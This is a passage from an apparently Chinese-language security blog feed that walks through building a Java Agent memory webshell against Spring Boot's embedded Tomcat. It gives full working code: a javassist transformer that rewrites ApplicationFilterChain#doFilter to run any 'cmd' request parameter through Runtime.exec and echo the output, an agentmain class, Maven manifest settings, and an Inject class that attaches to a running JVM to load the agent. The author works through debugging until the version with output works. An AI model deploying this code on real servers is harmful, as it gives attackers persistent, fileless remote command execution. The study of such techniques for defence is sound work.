class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.example.Main&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;Hello&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的MF文件需要修改成如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br><br></code></pre></td></tr></table></figure><p>然后直接用maven打jar包</p><p><img src="https://cdn.clown2024.cn/image-20241031113452048.png" alt="image-20241031113452048"></p><blockquote><p>maven打成jar包有一个坑点，他会默认替换你的MF文件变成这样</p><p><img src="https://cdn.clown2024.cn/image-20241031114835052.png" alt="image-20241031114835052"></p><p>我们可以手动替换一下jar包里面的MF文件，或者我们可以配置一下maven的打包插件让他自动生成MF文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br><span class="hljs-comment">&lt;!--                            &lt;Premain-Class&gt;org.example.Agent.premainAgent&lt;/Premain-Class&gt;--&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Agent-Class</span>&gt;</span>org.example.Agent.agentmainAgent<span class="hljs-tag">&lt;/<span class="hljs-name">Agent-Class</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在再打包就有需要的属性了</p><p><img src="https://cdn.clown2024.cn/image-20241031115458888.png" alt="image-20241031115458888"></p></blockquote><p>最后编写Agent的注入类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行效果如下：</p><blockquote><p>不过如果想要用javassist来修改的话，目标类也需要引入javassist依赖才行，不然会报错</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241031115558447.png" alt="image-20241031115558447"></p><h2 id="instrumentation的局限"><a href="#Instrumentation的局限" class="headerlink" title="Instrumentation的局限"></a>Instrumentation的局限</h2><p>premain 和 agentmain 两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 <code>Instrumentation#redefineClasses</code> 方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 </li><li>新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是 private static&#x2F;final 修饰的</li><li>可以修改方法体</li></ol><h1 id="java-agent实现spring-filter内存马"><a href="#Java-Agent实现Spring-Filter内存马" class="headerlink" title="Java Agent实现Spring Filter内存马"></a>Java Agent实现Spring Filter内存马</h1><p>因为springboot内置了Tomcat服务，所以我们找到Filter链中一定会执行的方法，然后重写他即可</p><p>他的流程为ApplicationFilterChain#doFilter&#x3D;&#x3D;》ApplicationFilterChain#internalDoFilter</p><p><img src="https://cdn.clown2024.cn/image-20241031170819582.png" alt="image-20241031170819582"></p><p><img src="https://cdn.clown2024.cn/image-20241031170835475.png" alt="image-20241031170835475"></p><p>这两个方法都能够拿到ServletRequest 和 ServletResponse，而且hook不会影响正常业务逻辑</p><p>所以我们重写ApplicationFilterChain#internalDoFilter或者doFilter方法来打入内存马即可</p><h2 id="编写agent内存马"><a href="#编写agent内存马" class="headerlink" title="编写agent内存马"></a>编写agent内存马</h2><p>照例先实现一个ClassFileTransformer，这里的ServletRequest需要我们自己去源码看一下具体是什么类，这里是jakarta.servlet.ServletRequest</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.ServletRequest request = $1\n;&quot;</span> + <span class="hljs-comment">//$1为第一个参数，也就是request请求实例</span><br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>agentmain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//获取所有已加载的类</span><br>        <span class="hljs-comment">//获取目标JVM加载的全部类</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;<br>                <span class="hljs-comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>MF文件就和前面一样，这里就不再写出来了</p><p>最后是Inject类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        System.out.println(list);<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.dev.DevApplication&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;成功插入agent&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里还有一个很坑的点，就是版本问题，我们的javaagent的jar包和inject类都需要是符合目标的jdk版本的，估计是低版本不能向高版本注入的问题</p><p>现在我们吧springboot服务开起来，然后启动inject注入agent就可以打入内存马了</p><p><img src="https://cdn.clown2024.cn/image-20241031204330693.png" alt="image-20241031204330693"></p><p><img src="https://cdn.clown2024.cn/image-20241031204345365.png" alt="image-20241031204345365"></p><p>我看有些文章可以将inject类写成jar包，传入vm的pid和agent的jar包参数就能命令行执行了，不过需要相关的内存工具来获取pid才行。</p><h2 id="agent内存马回显问题"><a href="#agent内存马回显问题" class="headerlink" title="agent内存马回显问题"></a>agent内存马回显问题</h2><p>这里的简单内存马不带回显感觉不方便，我又去网上找了一下有回显的写法，ClassFileTransformer就可以改成下面这样</p><p>参考这篇文章：<a href="https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/">https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;internalDoFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体,带回显</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = $2.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;else&#123;internalDoFilter($1,$2);&#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<span class="hljs-comment">//在方法前插入代码</span><br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.detach();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>emmm但是有个很奇怪的问题，他每次请求完就会卡住，然后就报下面的错误：</p><p><img src="https://cdn.clown2024.cn/image-20241031215713085.png" alt="image-20241031215713085"></p><p>意思是JVM在运行的时候找不到类的定义，这就很奇怪了，然后试了很多其他的操作发现都是报这个错误，只有前面那个简单的内存马能通，不知道为什么</p><p>我直接copy了他的整个doFilter方法也不行红温了😡</p><p>fuck我改了一晚上终于行了，这是成功的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            String body=<span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletRequest req = $1;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletResponse res = $2;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;try &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=req.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = res.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;internalDoFilter(req, res);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;return null;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125; catch (java.lang.Exception pe) &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果只需要比前面那个多一段**internalDoFilter(req, res);**方法的调用就可以了，我估计是不调用该方法调用链就会直接断掉，导致我发请求就卡在那里不动</p><p><img src="https://cdn.clown2024.cn/image-20241031231112320.png" alt="image-20241031231112320"></p><p>而且这种方法写如果弹计算器的话他会弹五次，说明他调用链中走了五次doFilter方法</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&u_asig=1a0c384b17302758676971458e00f7&time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt+teD">https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&amp;u_asig=1a0c384b17302758676971458e00f7&amp;time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt%2BteD</a></p><p><a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-agent介绍&quot;&gt;&lt;a href=&quot;#Java-Agent介绍&quot; class=&quot;headerlink&quot; title=&quot;Java Agent介绍&quot;&gt;&lt;/a&gt;Java Agent介绍&lt;/h1&gt;&lt;p&gt;官方文档：&lt;a href=&quot;https://docs.ora</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>JDK17反射限制绕过学习</title>
    <link href="https://clowsman.github.io/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-29T15:44:00.000Z</published>
    <updated>2024-10-30T06:54:46.141Z</updated>
    
